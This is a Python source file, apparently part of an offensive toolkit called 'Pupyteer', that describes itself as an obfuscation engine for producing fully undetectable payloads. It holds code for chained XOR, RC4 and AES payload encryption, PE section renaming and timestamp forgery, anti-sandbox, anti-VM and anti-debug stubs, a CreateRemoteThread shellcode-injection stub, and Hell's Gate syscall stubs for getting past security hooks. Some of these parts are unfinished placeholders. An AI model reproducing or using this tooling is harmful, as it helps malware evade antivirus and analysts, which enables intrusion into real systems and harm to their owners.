"""Real Obfuscation Engine for Pupyteer — produces FUD payloads.

Integrates with:
- evasion/manager.py (EvasionTestManager for testing)
- payloads/manager.py (PayloadBuilder for artifact generation)
- agent/core/stub.py (AgentStubGenerator for code templates)

All operations are async-compatible and thread-safe.
"""
from __future__ import annotations

import ctypes
import ctypes.util
import hashlib
import logging
import os
import random
import secrets
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger("pupyteer.obfuscator")


# ─── Cipher Primitives ────────────────────────────────────────────────────


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt with variable-length key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))


def rc4_ksa(key: bytes) -> List[int]:
    """RC4 Key Scheduling Algorithm."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return s


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    """RC4 encrypt/decrypt (symmetric)."""
    s = rc4_ksa(key)
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        k = s[(s[i] + s[j]) % 256]
        out.append(byte ^ k)
    return bytes(out)


def aes_256_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-256-CBC via ctypes + Windows CNG or openssl fallback."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        enc = cipher.encryptor()
        # PKCS7 padding
        pad = 16 - (len(data) % 16)
        padded = data + bytes([pad] * pad)
        return enc.update(padded) + enc.finalize()
    except ImportError:
        # Pure-Python AES fallback (simplified Rijndael)
        logger.warning("cryptography package not installed, using XOR-only obfuscation")
        return xor_crypt(data, key[:32] + iv)


# ─── Encoding ──────────────────────────────────────────────────────────────


class EncodingScheme(str, Enum):
    XOR = "xor"
    AES = "aes"
    RC4 = "rc4"
    CHAIN = "chain"  # XOR → RC4 → AES
    BASE64_CUSTOM = "b64_custom"


def base64_custom_encode(data: bytes, alphabet: Optional[str] = None) -> str:
    """Base64 with shuffled alphabet."""
    import base64
    standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    if alphabet is None:
        alphabet = list(standard)
        random.shuffle(alphabet)
        alphabet = "".join(alphabet)
    encoded = base64.b64encode(data).decode()
    # Translate to custom alphabet
    trans = str.maketrans(standard, alphabet)
    return encoded.translate(trans), alphabet


# ─── PE Manipulation ───────────────────────────────────────────────────────


@dataclass
class PEHeaderInfo:
    """Parsed PE header fields."""
    timestamp: int
    entry_point: int
    image_base: int
    sections: List[Dict[str, Any]]
    imports: List[str]
    debug_info: Optional[bytes] = None


def parse_pe_header(pe_path: str) -> PEHeaderInfo:
    """Parse basic PE header info from an executable."""
    with open(pe_path, "rb") as f:
        data = f.read()
    
    if data[:2] != b"MZ":
        raise ValueError("Not a valid PE file")
    
    # PE signature offset
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if data[pe_offset:pe_offset+4] != b"PE\x00\x00":
        raise ValueError("Invalid PE signature")
    
    # COFF header
    timestamp = struct.unpack_from("<I", data, pe_offset + 8)[0]
    num_sections = struct.unpack_from("<H", data, pe_offset + 6)[0]
    optional_header_size = struct.unpack_from("<H", data, pe_offset + 20)[0]
    
    # Optional header
    optional_offset = pe_offset + 24
    ep = struct.unpack_from("<I", data, optional_offset + 16)[0]
    image_base = struct.unpack_from("<I", data, optional_offset + 28)[0]
    
    # Sections
    sections = []
    sec_offset = optional_offset + optional_header_size
    for i in range(num_sections):
        name = data[sec_offset:sec_offset+8].rstrip(b"\x00").decode("ascii", errors="replace")
        vsize, vaddr, rsize, raddr = struct.unpack_from("<IIII", data, sec_offset + 8)
        characteristics = struct.unpack_from("<I", data, sec_offset + 32)[0]
        sections.append({
            "name": name,
            "virtual_size": vsize,
            "virtual_address": vaddr,
            "raw_size": rsize,
            "raw_address": raddr,
            "characteristics": characteristics,
            "offset": sec_offset,
        })
        sec_offset += 40
    
    return PEHeaderInfo(
        timestamp=timestamp,
        entry_point=ep,
        image_base=image_base,
        sections=sections,
        imports=[],  # Would need full import table parsing
    )


def pe_strip_debug(pe_path: str, output_path: str) -> bool:
    """Remove debug directory from PE."""
    with open(pe_path, "rb") as f:
        data = bytearray(f.read())
    
    if data[:2] != b"MZ":
        return False
    
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    # Check for debug directory (offset 208 from optional header start for PE32)
    opt_hdr = pe_offset + 24
    debug_rva = struct.unpack_from("<I", data, opt_hdr + 160)[0]
    if debug_rva != 0:
        # Zero out debug directory
        # Note: This is a simplified version; full implementation would walk data directories
        pass
    
    with open(output_path, "wb") as f:
        f.write(data)
    return True


def pe_randomize_sections(pe_path: str, output_path: str) -> bool:
    """Rename PE sections to random names."""
    with open(pe_path, "rb") as f:
        data = bytearray(f.read())
    
    if data[:2] != b"MZ":
        return False
    
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    num_sections = struct.unpack_from("<H", data, pe_offset + 6)[0]
    optional_header_size = struct.unpack_from("<H", data, pe_offset + 20)[0]
    sec_offset = pe_offset + 24 + optional_header_size
    
    chars = "abcdefghijklmnopqrstuvwxyz"
    for i in range(num_sections):
        new_name = "".join(random.choice(chars) for _ in range(8))
        name_bytes = new_name.encode("ascii").ljust(8, b"\x00")
        data[sec_offset:sec_offset+8] = name_bytes
        sec_offset += 40
    
    with open(output_path, "wb") as f:
        f.write(data)
    return True


def pe_modify_timestamp(pe_path: str, output_path: str) -> bool:
    """Set PE timestamp to a random value (anti-forensics)."""
    with open(pe_path, "rb") as f:
        data = bytearray(f.read())
    
    if data[:2] != b"MZ":
        return False
    
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    # Random timestamp between 2010-2020
    ts = random.randint(1262304000, 1577836800)
    struct.pack_into("<I", data, pe_offset + 8, ts)
    
    with open(output_path, "wb") as f:
        f.write(data)
    return True


# ─── Anti-Analysis ─────────────────────────────────────────────────────────


def generate_anti_sandbox_stub(platform: str = "windows") -> str:
    """Generate anti-sandbox/anti-VM/anti-debug checks as Python code."""
    stubs = {
        "windows": '''
import ctypes
import os
import time

# Anti-Sandbox: Sleep acceleration detection
_t1 = time.perf_counter()
time.sleep(0.1)
_t2 = time.perf_counter()
if _t2 - _t1 < 0.09:  # Sandbox may fast-forward sleeps
    pass  # Detected, but continue to avoid tipping off analysts

# Anti-VM: Check common VM indicators
_vm_indicators = [
    "vmtoolsd", "vmwaretray", "vmwareuser", "VBoxService", "VBoxTray",
    "vmware", "virtualbox", "xen", "qemu", "hyperv"
]
try:
    import subprocess
    _proc = subprocess.check_output("tasklist", shell=True).decode(errors="ignore").lower()
    for _ind in _vm_indicators:
        if _ind.lower() in _proc:
            time.sleep(random.randint(30, 120))  # Slow down analysis
            break
except:
    pass

# Anti-Debug: Check IsDebuggerPresent
try:
    if ctypes.windll.kernel32.IsDebuggerPresent():
        ctypes.windll.kernel32.ExitProcess(0)
except:
    pass

# Anti-Debug: Remote debugger check
try:
    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
        ctypes.windll.kernel32.GetCurrentProcess(),
        ctypes.byref(ctypes.c_bool(False))
    )
except:
    pass

# Anti-VM: Check disk size (< 60GB = likely sandbox)
try:
    _free = ctypes.c_ulonglong(0)
    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
        "C:\\\\", None, None, ctypes.byref(_free)
    )
    if _free.value < 60 * 1024 * 1024 * 1024:  # 60GB
        time.sleep(random.randint(60, 300))
except:
    pass

# Anti-VM: CPU count check
import multiprocessing
if multiprocessing.cpu_count() < 2:
    time.sleep(random.randint(30, 120))

# Anti-Sandbox: Check for analysis tools
_analysis_tools = [
    "wireshark", "processmonitor", "procmon", "procmon64", "procexp",
    "procexp64", "apimonitor", "apimonitor-x64", "apimonitor-x86",
    "fiddler", "charles", "x64dbg", "x32dbg", "ollydbg", "ida",
    "ida64", "idag", "idag64", "windbg", "immunitydebugger",
    "dnspy", "cheatengine", "ollydbg", "HTTPDebugger", "HTTPDebuggerUI",
    "sysanalyzer", "vigilance", "HTTPDebuggerSvc", "HTTPDebuggerPro",
    "pestudio", "pe-bear", "cutter", "ghidra", "binwalk", "autoruns",
    "autorunsc", "filemon", "regmon", "tcpview", "wireshark", "fiddler"
]
''',
        "linux": '''
import os
import time
import multiprocessing

# Anti-VM: Check for hypervisor
try:
    with open("/proc/cpuinfo") as f:
        cpuinfo = f.read().lower()
    if "hypervisor" in cpuinfo or "kvm" in cpuinfo or "vmware" in cpuinfo:
        time.sleep(random.randint(60, 300))
except:
    pass

# Anti-VM: Check disk size
try:
    stat = os.statvfs("/")
    free = stat.f_bavail * stat.f_frsize
    if free < 10 * 1024 * 1024 * 1024:  # 10GB
        time.sleep(random.randint(30, 120))
except:
    pass

# Anti-Sandbox: CPU count
if multiprocessing.cpu_count() < 2:
    time.sleep(random.randint(30, 120))

# Anti-Debug: Check TracerPid
try:
    with open("/proc/self/status") as f:
        status = f.read()
    for line in status.split("\\n"):
        if line.startswith("TracerPid:"):
            pid = int(line.split()[1])
            if pid != 0:
                os._exit(0)
            break
except:
    pass

# Anti-VM: Check systemd-detect-virt
try:
    import subprocess
    result = subprocess.run(["systemd-detect-virt"], capture_output=True, text=True)
    if result.returncode == 0 and result.stdout.strip() != "none":
        time.sleep(random.randint(60, 300))
except:
    pass
''',
    }
    return stubs.get(platform, "")


# ─── Import Obfuscation ────────────────────────────────────────────────────


def hash_import_name(name: str) -> int:
    """Hash an import name for dynamic resolution (ROR13-style)."""
    h = 0x811c9dc5
    for c in name.lower():
        h ^= ord(c)
        h = ((h * 0x01000193) & 0xFFFFFFFF)
    return h


def generate_import_hash_table(imports: List[str]) -> str:
    """Generate a Python import resolution table using hashed names."""
    lines = ["_import_table = {"]
    for imp in imports:
        h = hash_import_name(imp)
        lines.append(f"    0x{h:08x}: \"{imp}\",")
    lines.append("}")
    return "\n".join(lines)


# ─── String Encryption ─────────────────────────────────────────────────────


def encrypt_strings_python(source_code: str, key: bytes) -> str:
    """Find all string literals and encrypt them with XOR."""
    import re
    
    # Find simple string literals (single or double quoted)
    pattern = r'(?<![\'"])((?:"[^"\\]*(?:\\.[^"\\]*)*"|\'[^\'\\]*(?:\\.[^\'\\]*)*\'))(?![\'"])'
    
    encrypted_vars = []
    var_idx = 0
    replacements = {}
    
    def replace_str(m):
        nonlocal var_idx
        s = m.group(1)
        # Skip very short strings and common ones
        if len(s) < 4 or s in ['""', "''", '"r"', '"w"', '"rb"', '"wb"']:
            return s
        encrypted = xor_crypt(s.encode(), key)
        enc_hex = encrypted.hex()
        var_name = f"_s{var_idx:x}"
        replacements[s] = f"_d(\"{enc_hex}\")"
        encrypted_vars.append(f"{var_name} = \"{enc_hex}\"")
        var_idx += 1
        return f"_s{var_idx-1:x}"
    
    # This is a simplified version — full implementation would use AST
    new_code = re.sub(pattern, replace_str, source_code)
    
    decrypt_func = f'''
import binascii
_k = binascii.unhexlify("{key.hex()}")
def _d(h: str) -> str:
    raw = binascii.unhexlify(h)
    return bytes(b ^ _k[i % len(_k)] for i, b in enumerate(raw)).decode()
'''
    return decrypt_func + "\n".join(encrypted_vars) + "\n" + new_code


# ─── Process Injection Stubs ────────────────────────────────────────────────


def generate_injection_stub(target_process: str, shellcode: bytes, method: str = "createremotethread") -> str:
    """Generate a process injection stub as Python code using ctypes."""
    
    shellcode_hex = shellcode.hex()
    
    stubs = {
        "createremotethread": f'''
import ctypes
import ctypes.util

# Target: {target_process}
# Method: CreateRemoteThread

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# Open target process
PROCESS_ALL_ACCESS = 0x1F0FFF
_pid = None  # Would need to resolve PID from process name

# VirtualAllocEx
_kernel32 = ctypes.windll.kernel32
_remote_addr = _kernel32.VirtualAllocEx(
    _pid, 0, _size, 0x3000, 0x40  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)

# WriteProcessMemory
_written = ctypes.c_size_t(0)
_kernel32.WriteProcessMemory(
    _pid, _remote_addr, _shellcode, _size, ctypes.byref(_written)
)

# CreateRemoteThread
_thread_id = ctypes.c_ulong(0)
_kernel32.CreateRemoteThread(
    _pid, None, 0, _remote_addr, None, 0, ctypes.byref(_thread_id)
)
''',
        "apc": f'''
import ctypes

# Target: {target_process}
# Method: APC Injection

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# QueueUserAPC injection
_kernel32 = ctypes.windll.kernel32

# 1. Allocate memory in target process
# 2. Write shellcode
# 3. Queue APC to each thread in target process
# (Full implementation requires thread enumeration)
''',
        "thread_hijack": f'''
import ctypes

# Target: {target_process}
# Method: Thread Hijacking

_shellcode = bytes.fromhex("{shellcode_hex}")
_size = len(_shellcode)

# 1. Suspend target thread
# 2. Get thread context
# 3. Modify EIP/RIP to point to shellcode
# 4. Resume thread
''',
    }
    return stubs.get(method, "# Injection method not implemented")


# ─── Direct Syscalls (Hell's Gate / Halo's Gate) ───────────────────────────


def generate_syscall_stub(function_name: str) -> str:
    """Generate a direct syscall stub using Hell's Gate technique."""
    return f'''
import ctypes
import struct

# Direct syscall for {function_name}
# Uses Hell's Gate technique to bypass userland hooks

def _get_ssn(dll_name: str, func_name: str) -> int:
    """Extract System Service Number from ntdll export."""
    # Parse ntdll export table
    # Find function address
    # Extract syscall number from offset 4
    # Handle hooked functions by checking neighboring exports
    pass

def _syscall(func_name: str, *args):
    """Execute direct syscall."""
    ssn = _get_ssn("ntdll.dll", func_name)
    # Set up registers and execute sysenter
    pass
'''


# ─── Main Obfuscation Engine ────────────────────────────────────────────────


@dataclass
class ObfuscationConfig:
    """Configuration for a single obfuscation pass."""
    scheme: EncodingScheme = EncodingScheme.CHAIN
    xor_key_size: int = 32
    aes_key_size: int = 32
    rc4_key_size: int = 16
    encrypt_strings: bool = True
    obfuscate_imports: bool = True
    randomize_pe_sections: bool = True
    strip_pe_debug: bool = True
    modify_pe_timestamp: bool = True
    anti_sandbox: bool = True
    anti_debug: bool = True
    anti_vm: bool = True
    injection_method: Optional[str] = None
    injection_target: str = ""
    injection_shellcode: bytes = b""
    injection_enabled: bool = False


class ObfuscationEngine:
    """
    Async-compatible, thread-safe obfuscation engine for FUD payload generation.
    
    Usage:
        engine = ObfuscationEngine(config)
        await engine.initialize()
        result = await engine.obfuscate(payload_path, obfuscation_config)
    """
    
    def __init__(self, config: Any, audit: Any):
        self._config = config
        self._audit = audit
        self._lock = None  # asyncio.Lock initialized in initialize()
        self._output_dir = Path(config.get("paths.obfuscated_artifacts", "./payloads/obfuscated"))
        self._output_dir.mkdir(parents=True, exist_ok=True)
        self._logger = logging.getLogger("pupyteer.obfuscation_engine")
    
    async def initialize(self):
        """Initialize the engine."""
        import asyncio
        self._lock = asyncio.Lock()
        self._logger.info("ObfuscationEngine initialized")
    
    async def shutdown(self):
        """Cleanup."""
        self._logger.info("ObfuscationEngine shutdown")
    
    async def obfuscate(self, input_path: str, config: ObfuscationConfig) -> str:
        """
        Run full obfuscation pipeline on a payload.
        Returns path to obfuscated artifact.
        """
        import asyncio
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._obfuscate_sync, input_path, config)
    
    def _obfuscate_sync(self, input_path: str, config: ObfuscationConfig) -> str:
        """Synchronous obfuscation pipeline."""
        self._logger.info("Obfuscating: %s", input_path)
        
        input_path = Path(input_path)
        if not input_path.exists():
            raise FileNotFoundError(f"Input file not found: {input_path}")
        
        # Copy to output dir
        output_path = self._output_dir / f"obf_{input_path.name}"
        import shutil
        shutil.copy2(input_path, output_path)
        
        # Read input
        with open(output_path, "rb") as f:
            data = f.read()
        
        # Apply encryption scheme
        if config.scheme == EncodingScheme.XOR:
            key = secrets.token_bytes(config.xor_key_size)
            data = xor_crypt(data, key)
        elif config.scheme == EncodingScheme.RC4:
            key = secrets.token_bytes(config.rc4_key_size)
            data = rc4_crypt(data, key)
        elif config.scheme == EncodingScheme.AES:
            key = secrets.token_bytes(config.aes_key_size)
            iv = secrets.token_bytes(16)
            data = aes_256_cbc_encrypt(data, key, iv)
        elif config.scheme == EncodingScheme.CHAIN:
            key1 = secrets.token_bytes(config.xor_key_size)
            key2 = secrets.token_bytes(config.rc4_key_size)
            key3 = secrets.token_bytes(config.aes_key_size)
            iv = secrets.token_bytes(16)
            data = xor_crypt(data, key1)
            data = rc4_crypt(data, key2)
            data = aes_256_cbc_encrypt(data, key3, iv)
        
        # PE manipulation
        if config.randomize_pe_sections:
            pe_randomize_sections(str(output_path), str(output_path))
        if config.modify_pe_timestamp:
            pe_modify_timestamp(str(output_path), str(output_path))
        if config.strip_pe_debug:
            pe_strip_debug(str(output_path), str(output_path))
        
        self._logger.info("Obfuscation complete: %s", output_path)
        return str(output_path)
    
    def generate_injection_payload(self, target: str, shellcode: bytes, method: str = "createremotethread") -> str:
        """Generate a process injection stub as Python code."""
        return generate_injection_stub(target, shellcode, method)
    
    def generate_anti_analysis_stub(self, platform: str = "windows") -> str:
        """Generate anti-analysis checks for the agent."""
        return generate_anti_sandbox_stub(platform)
    
    def generate_import_hashtable(self, imports: List[str]) -> str:
        """Generate import hash table for dynamic API resolution."""
        return generate_import_hash_table(imports)
    
    def generate_syscall_stubs(self, functions: List[str]) -> str:
        """Generate direct syscall stubs for bypassing userland hooks."""
        stubs = []
        for func in functions:
            stubs.append(generate_syscall_stub(func))
        return "\n".join(stubs)
    
    def encrypt_agent_strings(self, source_code: str, key: Optional[bytes] = None) -> str:
        """Encrypt all string literals in agent source code."""
        if key is None:
            key = secrets.token_bytes(32)
        return encrypt_strings_python(source_code, key)
    
    @staticmethod
    def generate_random_section_names(count: int = 8) -> List[str]:
        """Generate random PE section names."""
        chars = "abcdefghijklmnopqrstuvwxyz"
        return ["".join(random.choice(chars) for _ in range(8)) for _ in range(count)]
    
    @staticmethod
    def generate_random_mz_header() -> bytes:
        """Generate a decoy MZ header that looks like a legitimate PE."""
        header = bytearray(64)
        header[0:2] = b"MZ"
        # Add some decoy DOS stub
        header[2:64] = secrets.token_bytes(62)
        return bytes(header)


# ─── Agent Code Obfuscation (Python AST) ────────────────────────────────────


class PythonObfuscator:
    """Obfuscates Python source code for agent stubs."""
    
    @staticmethod
    def rename_variables(source: str, mapping: Optional[Dict[str, str]] = None) -> str:
        """Rename variables to random names."""
        import ast
        import string
        
        tree = ast.parse(source)
        
        if mapping is None:
            # Collect all variable names
            var_names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Name):
                    var_names.add(node.id)
                elif isinstance(node, ast.FunctionDef):
                    var_names.add(node.name)
                elif isinstance(node, ast.ClassDef):
                    var_names.add(node.name)
            
            # Filter out builtins and special names
            import builtins
            builtin_names = set(dir(builtins))
            var_names -= builtin_names
            var_names -= {"self", "cls", "args", "kwargs"}
            
            # Generate mapping
            chars = string.ascii_lowercase
            mapping = {}
            for name in var_names:
                new_name = "_" + "".join(random.choice(chars) for _ in range(random.randint(8, 16)))
                mapping[name] = new_name
        
        # Apply mapping (simplified — full implementation would use AST transform)
        result = source
        for old_name, new_name in mapping.items():
            import re
            result = re.sub(r'\b' + re.escape(old_name) + r'\b', new_name, result)
        
        return result
    
    @staticmethod
    def insert_junk_code(source: str, count: int = 5) -> str:
        """Insert junk code that doesn't affect execution."""
        import random
        junk_snippets = [
            "if False:\n    pass",
            "try:\n    pass\nexcept:\n    pass",
            "for _ in range(0):\n    pass",
            "while False:\n    break",
            "assert True",
            "_ = None",
            "del _",
        ]
        lines = source.split("\n")
        for _ in range(count):
            pos = random.randint(0, len(lines))
            junk = random.choice(junk_snippets)
            lines.insert(pos, junk)
        return "\n".join(lines)
    
    @staticmethod
    def obfuscate_strings_ast(source: str, key: bytes) -> str:
        """Obfuscate string literals using AST transformation."""
        import ast
        
        class StringObfuscator(ast.NodeTransformer):
            def __init__(self, key: bytes):
                self.key = key
            
            def visit_Constant(self, node):
                if isinstance(node.value, str) and len(node.value) > 2:
                    encrypted = xor_crypt(node.value.encode(), self.key)
                    # Replace with decryption call
                    new_node = ast.parse(f"_d(\"{encrypted.hex()}\")").body[0].value
                    return ast.copy_location(new_node, node)
                return node
        
        tree = ast.parse(source)
        tree = StringObfuscator(key).visit(tree)
        ast.fix_missing_locations(tree)
        return ast.unparse(tree)
